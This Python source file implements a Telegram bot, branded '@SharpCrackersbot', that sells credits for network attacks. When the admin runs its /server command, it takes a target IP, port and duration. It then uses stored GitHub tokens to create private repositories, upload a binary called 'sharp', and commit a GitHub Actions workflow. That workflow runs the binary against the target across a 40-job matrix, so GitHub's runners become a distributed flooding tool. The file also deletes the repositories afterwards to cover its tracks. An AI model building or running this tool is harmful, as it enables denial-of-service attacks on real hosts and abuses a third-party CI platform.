# ─────────────────────────────────────────────────────────────
# ⚙️ CONFIGURATION & IMPORTS
# ─────────────────────────────────────────────────────────────

import os
import asyncio
import base64
import json
from datetime import datetime
from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, ContextTypes
from github import Github, InputGitTreeElement, Auth
from github.GithubException import GithubException

# ─────────────────────────────────────────────────────────────
# 🔐 SETTINGS
# ─────────────────────────────────────────────────────────────

TELEGRAM_TOKEN = '  YOUR TOKEN '
ADMIN_IDS = { ENTER YOUR USER ID}
DATA_FILE = 'sharp.json'
REPO_NAME = "sharpcracks"
CREDIT_COST_PER_ATTACK = 25

# ─────────────────────────────────────────────────────────────
# 🧠 GLOBALS & TEMPLATES
# ─────────────────────────────────────────────────────────────

user_sessions = {}

VBV_LOADING_FRAMES = [
    "🟦 [■□□□□]",
    "🟦 [■■□□□]",
    "🟦 [■■■□□]",
    "🟦 [■■■■□]",
    "🟦 [■■■■■]",
]

SHARP_YML_TEMPLATE = '''name: Run sharp 50x
on: [push]
jobs:
  sharp:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40]
    steps:
      - uses: actions/checkout@v3
      - name: Make binary executable
        run: chmod +x sharp
      - name: Run sharp binary
        run: ./sharp {ip} {port} {time} 999
'''

# ─────────────────────────────────────────────────────────────
# 💾 LOAD / SAVE SESSION
# ─────────────────────────────────────────────────────────────

def load_data():
    global user_sessions
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                user_sessions = json.load(f)
            # Convert approved lists back to sets
            for session in user_sessions.values():
                if 'approved' in session and isinstance(session['approved'], list):
                    session['approved'] = set(session['approved'])
        except Exception:
            user_sessions = {}

def save_data():
    to_save = {}
    for k, v in user_sessions.items():
        copy_sess = v.copy()
        if 'approved' in copy_sess and isinstance(copy_sess['approved'], set):
            copy_sess['approved'] = list(copy_sess['approved'])
        to_save[k] = copy_sess
    with open(DATA_FILE, 'w') as f:
        json.dump(to_save, f, indent=2)

load_data()

# ─────────────────────────────────────────────────────────────
# ✅ ADMIN CHECK
# ─────────────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# ─────────────────────────────────────────────────────────────
# 📦 COMMAND HANDLERS
# ─────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Show commands\n"
        "/approve <id> <credit> - Approve ID with credit (admin only)\n"
        "/credit <id> <credit> - Add credit to ID (admin only)\n"
        "/remove <id> - Remove ID approval (admin only)\n"
        "/token <token1> <token2> ... - Provide GitHub tokens separated by space (admin only)\n"
        "/server <ip> <port> <time> - Run binary with params on approved IDs\n"
        "/status - Show approved IDs and their credits\n"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <id> <credit>")
        return

    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer.")
        return

    session = user_sessions.get(chat_id, {})
    session.setdefault('credits', {})
    session.setdefault('approved', set())
    session['credits'][id_] = credit
    session['approved'].add(id_)
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Approved ID {id_} with {credit} credits.")

async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /credit <id> <credit>")
        return

    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer.")
        return

    session = user_sessions.get(chat_id, {})
    if id_ not in session.get('credits', {}):
        await update.message.reply_text(f"ID {id_} is not yet approved.")
        return

    session['credits'][id_] += credit
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Added {credit} credits to ID {id_}. Total: {session['credits'][id_]}")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <id>")
        return

    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    session = user_sessions.get(chat_id, {})
    if 'approved' in session and id_ in session['approved']:
        session['approved'].remove(id_)
    if 'credits' in session and id_ in session['credits']:
        del session['credits'][id_]
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Removed approval and credit for ID {id_}.")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /token <token1> <token2> ...")
        return

    chat_id = str(update.effective_chat.id)
    tokens = context.args
    session = user_sessions.get(chat_id, {})
    session['github_tokens'] = tokens
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Stored {len(tokens)} GitHub token(s).")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved = session.get('approved', set())
    credits = session.get('credits', {})
    if not approved:
        await update.message.reply_text("No approved IDs.")
        return
    lines = ["Approved IDs and credits:"]
    for id_ in approved:
        c = credits.get(id_, 0)
        lines.append(f"ID: {id_} — Credits: {c}")
    await update.message.reply_text("\n".join(lines))

# ─────────────────────────────────────────────────────────────
# 💣 ATTACK FUNCTIONALITY
# ─────────────────────────────────────────────────────────────

async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved_ids = session.get('approved', set())
    credits = session.get('credits', {})
    github_tokens = session.get('github_tokens', [])

    if not is_admin(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return

    if not github_tokens:
        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @SharpCrackersbot")
        return

    if not approved_ids:
        await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @SharpCrackersbot")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /server <ip> <port> <time> Power By @SharpCrackersbot")
        return

    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Time must be a positive integer")
        return

    if not os.path.isfile("sharp"):
        await update.message.reply_text("Local binary 'sharp' not found!")
        return

    await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
    msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
    frame_count = len(VBV_LOADING_FRAMES)
    for i, frame in enumerate(VBV_LOADING_FRAMES):
        percentage = int(((i + 1) / frame_count) * 100)
        display_message = f"{frame}  {percentage}% completed"
        await asyncio.sleep(1)
        try:
            await msg.edit_text(display_message)
        except Exception:
            pass

    tasks = []
    ids_to_remove = set()
    for id_ in list(approved_ids):
        credit = credits.get(id_, 0)
        if credit < CREDIT_COST_PER_ATTACK:
            await update.message.reply_text(f"ID {id_} does not have enough credit. Needs at least {CREDIT_COST_PER_ATTACK}.")
            ids_to_remove.add(id_)
            continue
        credits[id_] = credit - CREDIT_COST_PER_ATTACK
        # Run for each token to distribute load
        for token in github_tokens:
            tasks.append(run_workflow_with_token_and_id(chat_id, token, ip, port, time_int, id_))

    # Remove IDs without enough credits automatically if you want, or just skip them
    # For now, we only skip without removal

    user_sessions[chat_id]['credits'] = credits
    save_data()

    if not tasks:
        await update.message.reply_text("No IDs with enough credit to start attack.")
        return

    await asyncio.gather(*tasks)

    try:
        await msg.edit_text("✅ Attack successfully! Power By @SharpCrackersbot")
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────
# 🔁 GITHUB WORKFLOW FUNCTION
# ─────────────────────────────────────────────────────────────

async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, id_):
    try:
        # Ensure binary permission
        os.chmod("sharp", 0o755)

        g = Github(auth=Auth.Token(github_token))
        user = g.get_user()

        # Delete existing repos named REPO_NAME for clean slate
        try:
            repo_to_delete = None
            for repo in user.get_repos():
                if repo.name == REPO_NAME and repo.owner.login == user.login:
                    repo_to_delete = repo
                    break
            if repo_to_delete:
                repo_to_delete.delete()
                await asyncio.sleep(2)  # Wait for delete to propagate
        except GithubException:
            # Possibly repo does not exist or no permission, continue
            pass

        # Create new repo
        repo = user.create_repo(REPO_NAME, private=True, auto_init=True)
        branch = repo.default_branch or "main"

        base_ref = repo.get_git_ref(f"heads/{branch}")
        base_commit = repo.get_git_commit(base_ref.object.sha)
        base_tree = repo.get_git_tree(base_commit.sha)

        # Read binary content and encode in base64 for GitHub blob
        with open("sharp", "rb") as f:
            binary_content = f.read()

        binary_b64 = base64.b64encode(binary_content).decode('utf-8')
        blob = repo.create_git_blob(binary_b64, "base64")

        binary_element = InputGitTreeElement(
            path="sharp",
            mode='100755',
            type='blob',
            sha=blob.sha,
        )

        new_tree = repo.create_git_tree([binary_element], base_tree)
        new_commit = repo.create_git_commit("Add sharp binary", new_tree, [base_commit])
        base_ref.edit(new_commit.sha)

        # Add or update workflow YAML
        base_ref = repo.get_git_ref(f"heads/{branch}")
        base_commit = repo.get_git_commit(base_ref.object.sha)
        base_tree = repo.get_git_tree(base_commit.sha)

        yml_content = SHARP_YML_TEMPLATE.format(ip=ip, port=port, time=time)
        yml_element = InputGitTreeElement(
            path=".github/workflows/sharp.yml",
            mode='100644',
            type='blob',
            content=yml_content,
        )

        workflow_tree = repo.create_git_tree([yml_element], base_tree)
        workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
        base_ref.edit(workflow_commit.sha)

    except Exception as e:
        # Log or handle error silently
        print(f"Error running workflow for ID {id_}: {e}")

# ─────────────────────────────────────────────────────────────
# 🧹 CLEANUP & NOTIFY
# ─────────────────────────────────────────────────────────────

async def schedule_delete_and_notify(chat_id, github_token, repo_name, sec, ip, port, time, update):
    await asyncio.sleep(sec)
    try:
        g = Github(auth=Auth.Token(github_token))
        repo = g.get_user().get_repo(repo_name)
        repo.delete()
        await update.message.reply_text(f"🛑 Attack over on {ip}:{port} after {time} seconds.")
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────
# 🚀 MAIN FUNCTION
# ─────────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("credit", add_credit))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("token", token))
    app.add_handler(CommandHandler("server", server))
    app.add_handler(CommandHandler("status", status))
    print("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
